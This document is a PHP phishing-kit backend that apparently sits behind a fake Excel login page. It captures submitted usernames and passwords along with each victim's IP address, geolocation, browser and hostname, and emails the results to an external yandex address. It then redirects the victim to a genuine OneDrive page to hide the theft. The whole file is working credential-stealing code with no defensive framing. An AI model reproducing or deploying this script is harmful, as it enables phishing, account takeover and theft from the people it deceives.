<?
if($_POST["userid"]){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Excel Info-----------------------\n";
$message .= "Username            : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['Password']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY unknown-------------\n";
//change ur email here
$send = "alaberealabere@yandex.com";
$subject = "Result from Excel";
$headers = "From: Excel<alaberealabere@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: https://onedrive.live.com/edit.aspx?resid=6477715D0EDCB0AD!106&app=Excel&wdnd=1&wdPreviousSession=baf8a7ae-04c4-4c6d-96eb-378e4a70d351&wdNewAndOpenCt=1448464307871&wdPreviousCorrelation=27c5f738-7f91-47a3-8957-242ce87942ce");
     }

?>
